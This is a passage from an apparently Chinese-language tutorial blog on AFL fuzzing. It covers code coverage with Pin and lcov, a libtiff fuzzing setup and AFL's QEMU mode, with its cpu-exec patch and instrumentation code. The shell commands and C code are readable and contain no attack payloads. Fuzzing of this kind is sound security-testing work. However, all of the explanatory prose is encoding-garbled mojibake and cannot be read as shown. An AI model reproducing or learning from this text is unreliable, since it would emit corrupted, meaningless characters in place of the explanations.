ä¸­ä»¥å›¾å½¢åŒ–å½¢å¼å±•ç°ä»£ç çš„è¯¦ç»†æ‰§è¡Œè·¯å¾„ã€‚</p><p>åœ¨ lighthouse é¡¹ç›®çš„ coverageç›®å½•ä¸‹æä¾›äº† Pin æµ‹é‡ä»£ç è¦†ç›–ç‡çš„ Pintoolã€‚</p><p>Pinç­‰æ’æ¡©å·¥å…·é»˜è®¤ä½¿ç”¨çš„æ—¥å¿—æ–‡ä»¶æ ¼å¼ä¸º<code>drcov</code>æ ¼å¼ï¼Œè¿™æ˜¯ä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ¯ä¸ªåŸºæœ¬å—çš„ä¿¡æ¯çš„éƒ½æ˜¯ä»¥åå…­è¿›åˆ¶æ•°æ®è¿›è¡Œè®°å½•ã€‚è™½ç„¶äºŒè¿›åˆ¶å½¢å¼çš„è®°å½•æ–¹å¼æœ‰åˆ©äºæé«˜æ€§èƒ½ï¼Œä½†æ˜¯äººå·¥é˜…è¯»å›°éš¾ã€‚</p><p>ç›´æ¥è¿›è¡Œç¼–è¯‘æ—¶å‘ç”Ÿäº†æŠ¥é”™ï¼Œè¿™é‡Œå¯¹<code>Code</code>æ–‡ä»¶åšäº†ä¸€äº›ä¿®æ”¹ï¼š</p><p><strong><code>std::tr1</code>å‘½åç©ºé—´é”™è¯¯</strong>ï¼š- é”™è¯¯è¡¨æ˜ä»£ç å°è¯•ä½¿ç”¨<code>std::tr1::unordered_map</code>å’Œ<code>std::tr1::unordered_set</code>ï¼Œä½†è¿™äº›åœ¨è¾ƒæ–°çš„C++æ ‡å‡†ä¸­å·²ä¸å†éœ€è¦</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//using unordered_set = std::tr1::unordered_set&lt;V&gt;;</span><br><span class="hljs-keyword">using</span> unordered_set = std::unordered_set&lt;V&gt;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> K, <span class="hljs-keyword">typename</span> V&gt;<br><span class="hljs-comment">//using unordered_map = std::tr1::unordered_map&lt;K, V&gt;;</span><br><span class="hljs-keyword">using</span> unordered_map = std::unordered_map&lt;K, V&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·å–ä»£ç è¦†ç›–ç‡æ—¥å¿—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pin -t ./obj-intel64/CodeCoverage.so -- /bin/true<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ lcov æ¥å±•ç¤ºä»£ç è¦†ç›–ç‡å·¥å…·çš„ä½¿ç”¨ã€‚</p><p>lcov æ˜¯ gcc æµ‹è¯•è¦†ç›–ç‡çš„å‰æ®µå›¾å½¢å±•ç¤ºå·¥å…·ã€‚å®ƒé€šè¿‡æ”¶é›†å¤šä¸ªæºæ–‡ä»¶çš„è¡Œã€å‡½æ•°å’Œåˆ†æ”¯çš„ä»£ç è¦†ç›–ä¿¡æ¯ï¼ˆç¨‹åºæ‰§è¡Œä¹‹åç”Ÿæˆgcdaã€gcnoæ–‡ä»¶ï¼‰å¹¶ä¸”å°†æ”¶é›†åçš„ä¿¡æ¯ç”Ÿæˆ HTML é¡µé¢ã€‚ç”Ÿæˆ HTML éœ€è¦ä½¿ç”¨ genhtml å‘½ä»¤ã€‚</p><ul><li>ä½¿ç”¨LCOVæµ‹é‡ä»£ç è¦†ç›–ç‡</li><li>åˆ©ç”¨è¦†ç›–ç‡æ•°æ®æå‡æ¨¡ç³Šæµ‹è¯•æ•ˆç‡</li></ul><p>ä»£ç è¦†ç›–ç‡æ˜¯è¡¡é‡ä»£ç æ‰§è¡Œæƒ…å†µçš„æŒ‡æ ‡ï¼Œèƒ½å¯è§†åŒ–æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ã€‚</p><p>å®‰è£… lcovï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install lcov<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»£ç è¦†ç›–ç‡æ„å»ºé¡¹ç›®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">make clean<br>  <br>CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared<br>make<br>make install<br></code></pre></td></tr></table></figure><p>æ”¶é›†è¦†ç›–ç‡æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">lcov --zerocounters --directory ./<br>lcov --capture --initial --directory ./ --output-file app.info<br><span class="hljs-meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="hljs-variable">$HOME</span>/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</span><br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><p>å‘½ä»¤è¯´æ˜ï¼š</p><ul><li><code>lcov --zerocounters</code>ï¼šé‡ç½®è®¡æ•°å™¨</li><li><code>lcov --capture --initial</code>ï¼šç”ŸæˆåŸºçº¿è¦†ç›–ç‡æ–‡ä»¶</li><li>è¿è¡Œç›®æ ‡ç¨‹åºï¼ˆå¯å¤šæ¬¡æ‰§è¡Œä¸åŒè¾“å…¥ï¼‰</li><li>ä¿å­˜å½“å‰è¦†ç›–ç‡çŠ¶æ€</li></ul><p>ç”ŸæˆHTMLæŠ¥å‘Šï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">genhtml <span class="hljs-params">--highlight</span> <span class="hljs-params">--legend</span> -output-directory <span class="hljs-string">./html-coverage/</span> <span class="hljs-string">./app2.info</span><br></code></pre></td></tr></table></figure><p>æ‰“å¼€<code>./html-coverage/index.html</code>å³å¯æŸ¥çœ‹äº¤äº’å¼æŠ¥å‘Š</p><p>è¦†ç›–ç‡ç»Ÿè®¡ fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">CC=afl-gcc CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/&quot; --disable-shared<br><br><br>AFL_USE_ASAN=1 make -j$(nproc)<br>AFL_USE_ASAN=1 make install<br><br>lcov --zerocounters --directory ./   # é‡ç½®è®¡æ•°å™¨<br>lcov --capture --initial --directory ./ --output-file app.info<br><br>afl-fuzz -m none -i $HOME/Desktop/Fuzz/training/fuzzing_libtiff/tiff-4.0.4/test/images/ -o $HOME/Desktop/Fuzz/training/fuzzing_libtiff/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_libtiff/install/bin/tiffinfo -D -j -c -r -s -w @@<br><br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼Œlcovæ˜¯åˆ©ç”¨çš„ GCC çš„ä¸€äº›åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æŒ‡å®š CC çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨ afl-gccï¼Œè€ŒåŸºäº llvm çš„ afl-clang-fast&#x2F;afl-clang-lto éƒ½æ— æ³•æˆåŠŸè¿›è¡Œ lcov çš„åˆå§‹åŒ–ï¼Œè¿™ä¹Ÿæ˜¯ lcov ä¸æ–¹ä¾¿çš„åœ°æ–¹ã€‚</p><p>fuzz çš„é€Ÿåº¦ä¼šå˜æ…¢ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä½¿ç”¨ Master-Slave æ¨¡å¼æ¥åŠ å¿« fuzz é€Ÿåº¦ã€‚</p><p>ä»£ç è¦†ç›–ç‡å¯¹äº AFL è¿™ç§åŸºäºè¦†ç›–å¼•å¯¼çš„ fuzzer æ¥è¯´ï¼Œæ„ä¹‰é‡å¤§ï¼Œåˆ¤å®š fuzzer æ•ˆæœå¥½åçš„å…³é”®å› ç´ ä¹‹ä¸€å°±æ˜¯çœ‹å…¶ä»£ç è¦†ç›–ç‡çš„é«˜ä½ã€‚åœ¨å¯¹ fuzzer è¿›è¡Œä¼˜åŒ–å’Œæ”¹è¿›æ—¶ï¼Œå¾€å¾€ä¹Ÿæ˜¯æœç€å¯ä»¥æå‡ä»£ç è¦†ç›–ç‡çš„æ–¹å‘å»æ›´æ”¹ï¼Œæ¯•ç«Ÿæ‰§è¡Œè¶Šå¤šçš„ä»£ç ï¼Œè¶Šæœ‰å¯èƒ½å‘ç°æ›´å¤šçš„é—®é¢˜ã€‚</p><h2 id="é»‘ç›’Fuzz"><a href="#é»‘ç›’Fuzz" class="headerlink" title="é»‘ç›’Fuzz"></a>é»‘ç›’Fuzz</h2><p>é»‘ç›’ fuzz å°±æ˜¯åœ¨æ²¡æœ‰æºä»£ç çš„æƒ…å†µä¸‹å¯¹å·²ç»è¢«ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œ fuzzã€‚è¿™æ ·æˆ‘ä»¬å°±æ— æ³•ç¼–è¯‘æ’æ¡©äº†ï¼Œè¿™æ ·æˆ‘ä»¬è¯¥æ€ä¹ˆ fuzz è¿™ä¸ªç¨‹åºå‘¢ï¼Ÿ</p><ul><li><p>é™æ€äºŒè¿›åˆ¶é‡å†™</p><ul><li>Trampolineï¼ˆè·³è½¬ï¼‰ - å°†åŸºæœ¬å—çš„å¼€å¤´æŒ‡ä»¤æ”¹æˆ <code>&#123;call, jmp&#125; XXXX</code>ï¼Œè·³åˆ°æŒ‡å®šåœ°å€ <code>XXXX</code>ï¼Œè¯¥åœ°å€ä¸­æ”¾ç½®ç”¨äºæ”¶é›†è¦†ç›–åº¦çš„æŒ‡ä»¤ï¼ŒåŒæ—¶è¿˜ä¼šæ‰§è¡Œ&#x2F;ä¿®å¤åŸæœ¬çš„ç¨‹åºç‰‡æ®µï¼Œæœ€åå†è·³å›åŸå§‹ä»£ç ã€‚</li><li>ä»£è¡¨æ€§çš„è®ºæ–‡&#x2F;æ–¹æ³•æœ‰ï¼š<a href="https://ndltd.ncl.edu.tw/cgi-bin/gs32/gsweb.cgi/login?o=dnclcdr&s=id=%22106NCTU5726039%22.&searchmode=basic">ä»¥æ‰§è¡Œæ–‡ä»¶æ”¹å†™æ”¯æŒè¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•</a></li></ul></li><li><p>é‡æ–°ç»„è£…ï¼ˆReassembleï¼‰ - å°è¯•å°†æ–°å¢çš„æŒ‡ä»¤åµŒå…¥åŸæœ¬çš„åŸºæœ¬å—ä¸­ï¼ŒæŒ‘æˆ˜åœ¨äºå¦‚ä½•é‡æ–°ç»„ç»‡åŸæŒ‡ä»¤ï¼Œä½¿å…¶ä»èƒ½ç»´æŒåŸç¨‹åºé€»è¾‘ï¼Œå¹¶ä¸”æ–°å¢çš„æŒ‡ä»¤ä¸ä¼šå½±å“ç¨‹åºæ‰§è¡Œã€‚</p></li><li><p>åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©</p><ul><li>é€šè¿‡æ¨¡æ‹Ÿå™¨æ¨¡æ‹Ÿç¨‹åºæ‰§è¡Œï¼Œç‰¹åˆ«æ˜¯åœ¨å°†åŸºæœ¬å—è½¬æˆIRä¹‹å‰ï¼Œå…ˆæ’å…¥ä¸€æ®µæ”¶é›†è¦†ç›–åº¦çš„IRï¼Œåœ¨åŠ¨æ€æ¨¡æ‹Ÿæ‰§è¡Œæ—¶å°±èƒ½çŸ¥é“æ‰§è¡Œäº†å“ªäº›åŸºæœ¬å—ã€‚</li></ul></li></ul><p>åŠ¨æ€å’Œé™æ€å„è‡ªçš„ä¼˜ç‚¹ï¼š</p><ul><li>åŠ¨æ€ï¼šå¯ä»¥è·å¾—æ•°æ®çš„çŠ¶æ€ï¼Œæ¯”å¦‚ç»“æ„æˆ–ç±»å‹ï¼Œç»“æœè¾ƒä¸ºå‡†ç¡®ã€‚</li><li>é™æ€ï¼šåªåšä¸€æ¬¡åˆ†æå’Œä¿®æ­£ï¼Œå°±èƒ½èŠ‚çœåç»­æ‰§è¡Œå¸¦æ¥çš„å¼€é”€ã€‚</li></ul><p>åœ¨å®é™…åº”ç”¨ä¸­æˆ‘ä»¬åº”ç”¨æœ€å¤šçš„å°±æ˜¯åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©ã€‚</p><p>QEMU æ˜¯ä¸€ä¸ªç”¨äºæ¨¡æ‹Ÿç¨‹åºæ‰§è¡Œçš„å·¥å…·ï¼Œä¸»è¦åº”ç”¨äºæµ‹è¯•ç¨‹åºçš„æ‰§è¡Œï¼Œæˆ–è€…æ‰§è¡Œä¸åŒæŒ‡ä»¤é›†çš„ç¨‹åºã€‚QEMU å®é™…ä¸Šåˆ†ä¸ºä¸¤ç§æ¨¡å¼ï¼šå…¨ç³»ç»Ÿä»¿çœŸå’Œç”¨æˆ·æ¨¡å¼ä»¿çœŸï¼Œå‰è€…æ˜¯åŒ…å«æ“ä½œç³»ç»Ÿæ‰§è¡Œçš„æ¨¡æ‹Ÿï¼Œåè€…ä»…æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œã€‚QEMU çš„ä»£ç åº“éå¸¸åºå¤§ï¼Œç”±å¤šä¸ªç»„ä»¶ç»„æˆï¼Œå› æ­¤æ— æ³•åšéå¸¸è¯¦ç»†çš„ä»‹ç»ï¼Œä½†å¤§è‡´çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p><strong>åˆå§‹åŒ–</strong> - ä¸€äº›åˆå§‹åŒ–æœåŠ¡ï¼Œæ¯”å¦‚å†…å­˜ç®¡ç†ç­‰ï¼Œå¿…é¡»åœ¨æ‰§è¡Œç¨‹åºä¹‹å‰å®Œæˆã€‚</p></li><li><p><strong>å¤„ç†æ‰§è¡Œæ–‡ä»¶</strong> - è¯»å–ç”¨æˆ·æŒ‡å®šçš„æ‰§è¡Œæ–‡ä»¶å¹¶è§£æå…¶å…ƒæ•°æ®ã€‚</p></li><li><p><strong>æ¨¡æ‹Ÿæ‰§è¡Œ</strong> - QEMU æä¾›äº†å¤šç§æ¨¡æ‹Ÿæ–¹å¼ï¼Œä½†åŸºæœ¬ä¸Šéƒ½å¾ˆå¤æ‚ã€‚æœ€ç›´è§‚çš„æ–¹å¼æ˜¯ï¼šé€è¡Œè¯»å–æŒ‡ä»¤ï¼ŒæŸ¥çœ‹æŒ‡ä»¤çš„åŠ©è®°ç¬¦ï¼ˆå¦‚ <code>add</code>ã€<code>sub</code> ç­‰ï¼‰ï¼Œæ‰§è¡Œç›¸åº”çš„å¤„ç†å™¨ï¼Œè®°å½•æ‰§è¡Œç»“æœï¼Œç„¶åæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p></li></ol><p>AFL çš„äºŒè¿›åˆ¶æ¨¡å¼æ˜¯é€šè¿‡ QEMU æ¨¡æ‹Ÿå™¨å®ç°çš„ã€‚ä¸è¿‡ï¼ŒQEMU é»˜è®¤å¹¶ä¸ä¼šè®°å½•è¦†ç›–ç‡ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹ QEMU çš„æºä»£ç æ¥å®ç°è¿™ä¸€åŠŸèƒ½ã€‚ç›¸å…³çš„ patch æ–‡ä»¶å¯ä»¥åœ¨ <a href="https://github.com/google/AFL/tree/master/qemu_mode/patches">AFL repo qemu_mode&#x2F;patches</a> ä¸­æ‰¾åˆ°ï¼Œä¸‹é¢ç®€è¦ä»‹ç»ä¸€ä¸‹è¿™äº›ä¿®æ”¹çš„å†…å®¹ã€‚</p><p>æœ‰ä¸€äº› diff æ–‡ä»¶ä»…åšäº†ä¸€äº›åˆå§‹åŒ–å’Œé…ç½®ï¼Œä»¥ä¸‹æ˜¯ç®€è¦çš„æ–‡å­—è¯´æ˜ï¼š</p><ul><li><p><code>syscall.diff</code> - æ›´æ–° kill å¤„ç†ï¼Œç¡®ä¿å‘é€ <code>SIGABRT</code> æ—¶ forkserver çº¿ç¨‹èƒ½å¤Ÿæ¥æ”¶åˆ°ã€‚</p></li><li><p><code>configure.diff / memfd.diff</code> - ä½¿ç”¨å†…å­˜æ˜ å°„ï¼ˆmemory mappingï¼‰è€Œä¸æ˜¯å†…å­˜æ–‡ä»¶æè¿°ç¬¦ï¼ˆmemory fdï¼‰ã€‚</p></li><li><p><code>elfload.diff</code> - åœ¨è§£ææ‰§è¡Œæ–‡ä»¶çš„å…ƒæ•°æ®æ—¶ï¼Œåˆå§‹åŒ– <code>afl_start_code</code> å’Œ <code>afl_end_code</code>ï¼Œè¿™ä¸¤ä¸ªæ ‡è®°ä»£è¡¨éœ€è¦è¢«æ”¶é›†è¦†ç›–ç‡çš„ç¨‹åºä»£ç åœ°å€çš„èµ·å§‹å’Œç»“æŸä½ç½®ï¼Œ<code>afl_entry_point</code> ç”¨æ¥è®°å½•ç¨‹åºçš„å…¥å£ç‚¹ã€‚</p></li></ul><p><strong>cpu-exec.diff</strong> ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/accel/tcg/cpu-exec.c  2017-08-15 11:39:41.000000000 -0700  </span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/accel/tcg/cpu-exec.c Â  Â   2017-08-22 14:34:55.868730680 -0700  </span><br><span class="hljs-meta">@@ -36,6 +36,8 @@</span>  <br> #include &quot;sysemu/cpus.h&quot;  <br> #include &quot;sysemu/replay.h&quot;  <br>   <br><span class="hljs-addition">+#include &quot;../patches/afl-qemu-cpu-inl.h&quot;  </span><br>â€‹  <br> typedef struct SyncClocks &#123;  <br><span class="hljs-meta">@@ -144,6 +146,8 @@</span>  <br> Â  Â  int tb_exit;  <br> Â  Â  uint8_t *tb_ptr = itb-&gt;tc_ptr;  <br>   <br><span class="hljs-addition">+ Â   AFL_QEMU_CPU_SNIPPET2;  </span><br><span class="hljs-addition">+  </span><br> Â  Â  qemu_log_mask_and_addr(CPU_LOG_EXEC, itb-&gt;pc,  <br> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   &quot;Trace %p [%d: &quot; TARGET_FMT_lx &quot;] %s\n&quot;,  <br> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   itb-&gt;tc_ptr, cpu-&gt;cpu_index, itb-&gt;pc,  <br><span class="hljs-meta">@@ -365,6 +369,7 @@</span>  <br> Â  Â  Â  Â  Â  Â  if (!tb) &#123;  <br> Â  Â  Â  Â  Â  Â  Â  Â  tb = tb_gen_code(cpu, pc, cs_base, flags, 0);  <br><span class="hljs-addition">+ Â  Â  Â  Â  Â  Â  Â   AFL_QEMU_CPU_SNIPPET1;  </span><br> Â  Â  Â  Â  Â  Â  &#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>AFL_QEMU_CPU_SNIPPET2</code> å®ä¼šåœ¨æ‰§è¡Œåˆ°ç¨‹åºä»£ç åœ°å€ç­‰åŒäº <code>afl_entry_point</code> æ—¶å”¤é†’ fork serverï¼Œå¹¶è®°å½•æ–°çš„è¦†ç›–ç‡ã€‚</p></li><li><p><code>AFL_QEMU_CPU_SNIPPET1</code> å®åˆ™ä¼šæå‰é€šçŸ¥ QEMU è¿›è¡Œè½¬æ¢ï¼Œé¿å…åœ¨ fork åè¿˜è¦é‡æ–°è¿›è¡Œè½¬æ¢ï¼Œä»è€Œå‡å°‘é¢å¤–çš„å¼€é”€ã€‚</p><ul><li>QEMU è½¬æ¢ä¼šå°†åŸæœ¬ç¨‹åºçš„æ±‡ç¼–ä»£ç è½¬æ¢ä¸º QEMU èƒ½å¤Ÿç†è§£çš„å½¢å¼ï¼ˆIRï¼‰ï¼Œç„¶åæ¨¡æ‹Ÿæ‰§è¡Œæ—¶ä¼šæ›´å¿«ã€‚</li></ul></li></ul><p><strong>afl-qemu-cpu-inl.h</strong> å®šä¹‰äº†ä¸æ¨¡ç³Šæµ‹è¯•ç›¸å…³çš„å¤„ç†ï¼Œä¸‹é¢æ‘˜å–äº†å…¶ä¸­é‡è¦çš„éƒ¨åˆ†è¿›è¡Œè¯´æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// é€šçŸ¥ tslï¼ˆtranslation handlerï¼‰å¯¹æŒ‡å®šåŸºæœ¬å—è¿›è¡Œè½¬æ¢  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do &#123; \  </span><br> Â  Â afl_request_tsl(pc, cs_base, flags); \  <br> Â &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)  <br>â€‹  <br><span class="hljs-comment">// å¦‚æœæ‰§è¡Œåˆ°å…¥å£ç‚¹ï¼Œå°±å”¤é†’ fork serverï¼Œ  </span><br><span class="hljs-comment">// å¹¶ä¸”è®°å½•è¦†ç›–ç‡  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do &#123; \  </span><br> Â  Â <span class="hljs-keyword">if</span>(itb-&gt;pc == afl_entry_point) &#123; \  <br> Â  Â  Â afl_setup(); \  <br> Â  Â  Â afl_forkserver(cpu); \  <br> Â  Â &#125; \  <br> Â  Â afl_maybe_log(itb-&gt;pc); \  <br> Â &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)  <br>â€‹  <br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> &#123;  <br>â€‹  <br> Â  Â <span class="hljs-type">static</span> __thread abi_ulong prev_loc;  <br> Â  Â <span class="hljs-comment">// é¿å…è®°å½•ä¸åœ¨ start ~ end èŒƒå›´çš„è¦†ç›–ç‡  </span><br> Â  Â <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)  <br> Â  Â  Â  Â <span class="hljs-keyword">return</span>;  <br>â€‹  <br> Â  Â cur_loc Â = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  <br> Â  Â cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <br>â€‹  <br>    <span class="hljs-comment">// é€šè¿‡æ¦‚ç‡æ’æ¡©è¿›è¡Œä¼˜åŒ–  </span><br> Â  Â <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  <br> Â  Â afl_area_ptr[cur_loc ^ prev_loc]++;  <br> Â  Â prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¯å¢ƒé…ç½®-1"><a href="#ç¯å¢ƒé…ç½®-1" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">CPU_TARGET=i386 ./build_qemu_support.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">make</span> distrib<br>sudo <span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>é’ˆå¯¹é»‘ç›’ã€ä»…æœ‰äºŒè¿›åˆ¶ç›®æ ‡çš„ä»ªå™¨åŒ–æ˜¯é€šè¿‡QEMUçš„â€œç”¨æˆ·ä»¿çœŸâ€æ¨¡å¼å®ç°çš„ã€‚è¿™ä¹Ÿå…è®¸æ‰§è¡Œè·¨æ¶æ„çš„ä»£ç â€”â€”ä¾‹å¦‚ï¼Œåœ¨x86ä¸Šè¿è¡ŒARMäºŒè¿›åˆ¶ç¨‹åºã€‚</p><p>QEMUä½¿ç”¨åŸºæœ¬å—ä½œä¸ºç¿»è¯‘å•å…ƒï¼›ä»ªå™¨åŒ–åˆ™æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šå®ç°çš„ï¼Œæ¨¡å‹ç±»ä¼¼äºç¼–è¯‘æ—¶é’©å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (block_address &gt; elf_text_start &amp;&amp; block_address &lt; elf_text_end) &#123;<br><br>Â  Â  cur_location = (block_address &gt;&gt; <span class="hljs-number">4</span>) ^ (block_address &lt;&lt; <span class="hljs-number">8</span>);<br><br>Â  Â  shared_mem[cur_location ^ prev_location]++;<br><br>Â  Â  prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>QEMUæ¨¡å¼çš„å¯åŠ¨ç›¸å¯¹è¾ƒæ…¢ï¼›ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒAFL forkæœåŠ¡å™¨é€šè¿‡æä¾›ä»¿çœŸå™¨ä¸çˆ¶è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡é€šé“æ¥è¿›è¡Œä¼˜åŒ–ã€‚è¯¥é€šé“ç”¨äºé€šçŸ¥çˆ¶è¿›ç¨‹ä»»ä½•æ–°é‡åˆ°çš„å—çš„åœ°å€ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°ç¿»è¯‘ç¼“å­˜ä¸­ï¼Œä»¥ä¾¿å°†æ¥å­è¿›ç¨‹å¯ä»¥å¤ç”¨ã€‚</p><p>é€šè¿‡è¿™äº›ä¼˜åŒ–ï¼ŒQEMUæ¨¡å¼çš„å¼€é”€å¤§çº¦ä¸º2-5å€ï¼Œç›¸æ¯”ä¹‹ä¸‹ï¼ŒPINçš„å¼€é”€è¶…è¿‡100å€ã€‚</p><p>æˆ‘ä»¬å‰é¢æ‰€å­¦ä¹ çš„éƒ½æ˜¯é€šè¿‡ AFL å¯¹å¼€æºç¨‹åºè¿›è¡Œ Fuzzï¼Œä¸‹é¢æˆ‘ä»¬å­¦ä¹ å¦‚ä½•é€šè¿‡ qemu_mode å¯¹é—­æºç¨‹åºè¿›è¡Œ Fuzzã€‚</p><p>AFL_USE_QASAN</p><p>ä½¿ç”¨ qemu fuzzå…¶å®ƒæ¶æ„çš„ç¨‹åºï¼Œæˆ–è€…å°†aflç§»æ¤åˆ°å¼‚æ¶æ„è®¾å¤‡ä¸Šã€‚</p><p>å‘Šè¯‰qemuä»æŸä¸ªåœ°å€å¯åŠ¨forkserverï¼Œå¾ªç¯èµ·å§‹çš„åœ°å€ï¼Œå¾ªç¯ç»“æŸçš„åœ°å€ã€‚</p><p>é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡ŒæŒç»­æ€§çš„fuzzã€‚</p><ul><li>ç¼–è¯‘</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¼–è¯‘qemu</span><br>./build_qemu_support.sh<br><span class="hljs-meta prompt_">#</span><span 